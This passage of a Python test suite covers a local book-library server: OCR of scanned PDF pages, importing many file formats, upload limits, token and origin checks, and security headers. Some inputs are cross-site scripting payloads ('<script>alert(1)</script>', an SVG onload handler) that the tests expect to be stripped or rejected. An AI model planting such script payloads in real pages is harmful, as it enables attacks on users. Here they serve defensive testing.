        self.assertEqual(self.library.chapter('art', 1), {**self.library.chapter('art', 1), 'text': 'Harness engineering guide', 'ocr': True})
        self.library.set_ocr_text('art', 2, 'Second page words')
        self.library.set_ocr_text('art', 1, 'Harness engineering guide, read again')
        self.assertEqual(self.library.book('art')['ocrPages'], 2)
        self.assertEqual([hit['location'] for hit in self.library.search('engineering', 'art')], [1])
        for location in (0, 4):
            with self.assertRaises(ValueError):
                self.library.set_ocr_text('art', location, 'x')
        import_book(write(self.root/'notes.md', '# Notes\n\ntext'), self.data, 'notes')
        with self.assertRaisesRegex(ValueError, 'already has a text layer'):
            self.library.set_ocr_text('notes', 1, 'x')
        self.assertEqual(sorted(p.name for p in (self.data/'library/art').iterdir()), ['book.json', 'chapters', 'source.pdf'])
        self.assertEqual(sorted(p.name for p in (self.data/'library/art/chapters').iterdir()), ['1.json', '2.json', '3.json'])

    def test_tesseract_is_optional_and_time_limited(self):
        with patch.object(book_ocr.shutil, 'which', return_value=None), patch.dict(book_ocr.KNOWN_PATHS, clear=True):
            self.assertEqual(book_ocr.status()['available'], False)
            self.assertIn('Tesseract', book_ocr.status()['install'])
            with self.assertRaises(LookupError):
                book_ocr.recognize(png(10, 10), self.root)
        with patch.object(book_ocr, 'tesseract_command', return_value=[sys.executable, '-c', 'import time; time.sleep(10)']), patch.object(book_ocr, 'PAGE_SECONDS', 0.5):
            with self.assertRaisesRegex(ValueError, 'longer than 0.5 seconds'):
                book_ocr.recognize(png(10, 10), self.root)
        with patch.object(book_ocr, 'tesseract_command', return_value=[sys.executable, '-c', 'import sys; print("words from " + sys.argv[1][-8:])']):
            self.assertEqual(book_ocr.recognize(png(10, 10), self.root).strip(), 'words from page.png')
            for raw in (b'<html>', jpeg(10, 10), png(1, 1)[:16] + struct.pack('>II', 10_000, 10_000) + png(1, 1)[24:]):
                with self.assertRaisesRegex(ValueError, 'PNG image'):
                    book_ocr.recognize(raw, self.root)
        self.assertEqual(list(self.root.glob('.ocr-*')), [])


FAKE_TESSERACT = """import sys
data = open(sys.argv[1], 'rb').read()
if not data.startswith(b'\\x89PNG') or sys.argv[2] != 'stdout':
    sys.exit(2)
print('Recognized harness words, page width ' + str(int.from_bytes(data[16:20], 'big')))
"""


class FormatServerTests(unittest.TestCase):
    """Uploads of every format through a disposable server, with a stand-in for Tesseract on PATH."""
    @classmethod
    def setUpClass(cls):
        import os, socket, subprocess
        from server_fixture import server_token
        cls.tmp = tempfile.TemporaryDirectory(prefix='book-formats-test-', ignore_cleanup_errors=True)
        cls.root = Path(cls.tmp.name)
        cls.data = cls.root/'data'
        tools = cls.root/'tools'
        tools.mkdir()
        script = write(tools/'fake_tesseract.py', FAKE_TESSERACT)
        if os.name == 'nt':
            write(tools/'tesseract.cmd', f'@"{sys.executable}" "{script}" %*\r\n')
        else:
            interpreter = sys.executable if ' ' not in sys.executable else '/usr/bin/env python3'
            launcher = write(tools/'tesseract', f'#!{interpreter}\n' + FAKE_TESSERACT)
            launcher.chmod(0o755)
        with socket.socket() as sock:
            sock.bind(('127.0.0.1', 0)); cls.port = sock.getsockname()[1]
        cls.url = f'http://127.0.0.1:{cls.port}'
        env = {**os.environ, 'ML_WORKSHOP_DATA_DIR': str(cls.data), 'PATH': str(tools) + os.pathsep + os.environ.get('PATH', '')}
        cls.proc = subprocess.Popen([sys.executable, str(ROOT/'backend/server.py'), '--port', str(cls.port)], env=env,
                                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        cls.token = server_token(cls.url, cls.data, cls.proc)

    @classmethod
    def tearDownClass(cls):
        import subprocess
        cls.proc.terminate()
        try:
            cls.proc.wait(timeout=10)
        except subprocess.TimeoutExpired:
            cls.proc.kill(); cls.proc.wait()
        cls.tmp.cleanup()

    def request(self, method, path, body=None, content_type=None, headers=None):
        import http.client
        connection = http.client.HTTPConnection('127.0.0.1', self.port, timeout=30)
        try:
            sent = {'X-Workshop-Token': self.token, **({'Content-Type': content_type} if content_type else {}), **(headers or {})}
            connection.request(method, path, body, sent)
            response = connection.getresponse()
            raw = response.read()
            kind = response.getheader('Content-Type', '')
            return response.status, (json.loads(raw) if kind == 'application/json' else raw), dict(response.getheaders())
        finally:
            connection.close()

    def upload(self, filename, raw, headers=None):
        from urllib.parse import urlencode
        status, data, _ = self.request('POST', '/api/library/import?' + urlencode({'filename': filename}), raw, 'application/octet-stream', headers)
        return status, data

    def get(self, path):
        status, data, headers = self.request('GET', path)
        self.assertEqual(status, 200, data)
        return data, headers

    def files(self):
        notebook = make_ipynb(self.root/'nb.ipynb', [{'cell_type': 'markdown', 'source': '# Gradient notes\n\nThe gradient points uphill.'},
                                                    {'cell_type': 'code', 'execution_count': 1, 'source': 'loss.backward()', 'outputs': []},
                                                    {'cell_type': 'markdown', 'source': '# Second\n\nMore gradient text.'}])
        report = make_docx(self.root/'report.docx', para('Intro', 'Heading1') + para('The gradient report.') + para('Results', 'Heading1') + para('Gradient results.')
                           + para('', runs=drawing('rImg')), f'<Relationship Id="rImg" Type="{IMAGE_REL}" Target="media/a.png"/>', {'word/media/a.png': png(3, 3)})
        return {
            'Gradient notes.md': ('markdown', b'# One\n\nA gradient here.\n\n# Two\n\nAnother gradient.'),
            'gradient.txt': ('text', b'The gradient of a loss.\n\nSecond paragraph.'),
            'gradient.html': ('html', b'<title>Gradient page</title><h1>One</h1><p>gradient one</p><h1>Two</h1><p>gradient two</p><script>alert(1)</script>'),
            'report.docx': ('docx', report.read_bytes()),
            'nb.ipynb': ('ipynb', notebook.read_bytes()),
            'chart.png': ('image', png(30, 20)),
        }

    def test_every_format_imports_reads_saves_position_and_searches(self):
        for filename, (kind, raw) in self.files().items():
            with self.subTest(filename=filename):
                status, result = self.upload(filename, raw)
                self.assertEqual(status, 200, result)
                book = result['book']
                self.assertEqual((book['format'], book['sourceExtension']), (kind, filename.rsplit('.', 1)[1]))
                self.assertNotIn('sourceFile', book)
                chapter, _ = self.get(f"/api/library/{book['id']}/chapter/{book['count']}")
                self.assertNotIn('<script', chapter.get('html', ''))
                original, headers = self.get(f"/api/library/{book['id']}/asset/source.{book['sourceExtension']}")
                self.assertEqual(original, raw)
                self.assertEqual(headers['Content-Security-Policy'], "default-src 'none'; sandbox")
                self.assertEqual(headers['X-Content-Type-Options'], 'nosniff')
                expected = {'markdown': 'text/markdown; charset=utf-8', 'text': 'text/plain; charset=utf-8', 'html': 'text/plain; charset=utf-8',
                            'image': 'image/png', 'ipynb': 'application/x-ipynb+json'}.get(kind)
                if expected:
                    self.assertEqual(headers['Content-Type'], expected)
                for asset in book['assets']:
                    self.get(f"/api/library/{book['id']}/asset/{asset['path']}")
                state = dict(bookId=book['id'], location=book['count'], notes=f'Notes on {filename}', bookmarks=sorted({1, book['count']}), completed=[], updatedAt=1000)
                status, saved, _ = self.request('POST', '/api/library/state', json.dumps(state).encode(), 'application/json')
                self.assertEqual((status, saved['applied']), (200, True))
                library_data, _ = self.get('/api/library')
                stored = library_data['readingState'][book['id']]
                self.assertEqual((stored['location'], stored['bookmarks'], stored['notes']), (book['count'], sorted({1, book['count']}), f'Notes on {filename}'))
                bad = {**state, 'location': book['count'] + 1, 'updatedAt': 2000}
                self.assertEqual(self.request('POST', '/api/library/state', json.dumps(bad).encode(), 'application/json')[0], 400)
                hits, _ = self.get(f"/api/library/search?q=gradient&book={book['id']}")
                if kind == 'image':
                    self.assertEqual((hits['results'], book['textPages']), ([], 0))
                else:
                    self.assertTrue(hits['results'], filename)
                    self.assertEqual(hits['results'][-1]['location'], book['count'])
                status, again = self.upload('renamed.' + filename.rsplit('.', 1)[1], raw)
                self.assertEqual((status, again['alreadyImported'], again['readingState']['location']), (200, True, book['count']))

    def test_unsupported_and_oversized_files_get_clear_messages(self):
        for filename in ('notes.rtf', 'deck.pptx', 'drawing.svg', 'archive.zip', 'noextension'):
            with self.subTest(filename=filename):
                status, result = self.upload(filename, b'content')
                self.assertEqual(status, 400, result)
                self.assertIn('not supported', result['error'])
                self.assertIn('Markdown', result['error'])
        status, result = self.upload('huge.md', b'x', {'Content-Length': str((16 << 20) + 1)})
        self.assertEqual(status, 413); self.assertIn('Markdown file no larger than 16 MB', result['error'])
        for filename, raw in (('bad.docx', b'not a zip'), ('bad.png', b'<svg onload="alert(1)"/>'), ('bad.ipynb', b'{'), ('bad.txt', b'\x00\x01')):
            with self.subTest(filename=filename):
                status, result = self.upload(filename, raw)
                self.assertEqual(status, 400, result)
        self.assertEqual(list(self.data.glob('.upload-*')) + list(self.data.glob('.parse-*')), [])

    def test_pdf_without_text_layer_and_ocr(self):
        source = make_no_text_pdf(self.root/'Harness guide.pdf', pages=3)
        status, result = self.upload('Harness guide.pdf', source.read_bytes())
        self.assertEqual(status, 200, result)
        book = result['book']
        self.assertEqual((book['title'], book['textPages'], [entry['title'] for entry in book['toc']]), ('Harness guide', 0, ['Page 1', 'Page 2', 'Page 3']))
        library_data, _ = self.get('/api/library')
        self.assertEqual(library_data['ocr']['available'], True)
        self.assertEqual(library_data['ocr']['maxPages'], library.MAX_OCR_PAGES)
        route = f"/api/library/{book['id']}/ocr?page="
        self.assertEqual(self.request('POST', route + '1', png(50, 70), 'image/jpeg')[0], 415)
        self.assertEqual(self.request('POST', route + '1', png(50, 70), 'image/png', {'X-Workshop-Token': 'wrong'})[0], 403)
        self.assertEqual(self.request('POST', route + '1', png(50, 70), 'image/png', {'Origin': 'https://example.org'})[0], 403)
        status, result, _ = self.request('POST', route + '2', png(50, 70), 'image/png')
        self.assertEqual(status, 400); self.assertIn('in order', result['error'])
        status, result, _ = self.request('POST', route + '1', b'<html>not a png</html>', 'image/png')
        self.assertEqual(status, 400); self.assertIn('PNG image', result['error'])
        status, result, _ = self.request('POST', route + '1', png(612, 792), 'image/png')
        self.assertEqual(status, 200, result)
        self.assertEqual((result['book']['ocrPages'], result['book']['textPages']), (1, 0))
        chapter, _ = self.get(f"/api/library/{book['id']}/chapter/1")
        self.assertEqual((chapter['text'], chapter['ocr']), ('Recognized harness words, page width 612', True))
        hits, _ = self.get(f"/api/library/search?q=harness+words&book={book['id']}")
        self.assertEqual([hit['location'] for hit in hits['results']], [1])
        self.assertEqual(self.request('POST', '/api/library/missing-book/ocr?page=1', png(5, 5), 'image/png')[0], 404)
        status, text_book = self.upload('ocr-notes.md', b'# Notes\n\ntext')
        status, result, _ = self.request('POST', f"/api/library/{text_book['book']['id']}/ocr?page=1", png(5, 5), 'image/png')
        self.assertEqual(status, 400); self.assertIn('already has a text layer', result['error'])
        self.assertEqual(list(self.data.glob('.upload-*')) + list(self.data.glob('.ocr-*')), [])


class SuggestedCardTests(FormatTestCase):
    """A suggested book's card checks the file's title, or accepts a verified edition by checksum."""
    def parse(self, source, card, title):
        import book_import
        # The worker parses into a new folder each time.
        destination = Path(tempfile.mkdtemp(dir=self.root))
        book_import.parse(source, destination, card, source.name, title)
        return json.loads((destination/'library'/card/'book.json').read_text())

    def test_known_edition_matches_its_card_without_a_title(self):
        import book_import
        source = make_no_text_pdf(self.root/'an_engineers_guide_to_harnesses.pdf', pages=3)
        title = "An engineer's guide to harnesses"
        with self.assertRaisesRegex(ValueError, 'no title inside it, and it is not a copy of'):
            self.parse(source, 'harness-guide', title)
        with patch.dict(library.KNOWN_EDITIONS, {library.digest(source): dict(book='harness-guide', title=title, pageOffset=-1, front=['Cover'])}):
            book = self.parse(source, 'harness-guide', title)
            self.assertEqual((book['id'], book['title']), ('harness-guide', title))
            with self.assertRaisesRegex(ValueError, 'titled'):
                self.parse(source, 'inference-engineering', 'Inference Engineering')
        self.assertEqual(book_import.file_title('an_engineers_guide__to_harnesses.pdf'), 'an engineers guide to harnesses')

    def test_a_titled_file_for_another_book_names_both_titles(self):
        from pypdf import PdfWriter
        writer = PdfWriter(); writer.add_blank_page(width=100, height=100); writer.add_metadata({'/Title': 'Some other book'})
        writer.write(self.root/'other.pdf')
        with self.assertRaisesRegex(ValueError, 'titled “Some other book”, not Inference Engineering'):
            self.parse(self.root/'other.pdf', 'inference-engineering', 'Inference Engineering')


class UnsupportedTests(FormatTestCase):
    def test_unsupported_types_get_a_clear_message(self):
        for name in ('notes.rtf', 'slides.pptx', 'sheet.xlsx', 'drawing.svg', 'archive.zip', 'script.js', 'noextension'):
            with self.subTest(name=name), self.assertRaisesRegex(ValueError, 'Choose a PDF, EPUB, Word'):
                self.load(name, 'content')


if __name__ == '__main__':
    unittest.main()
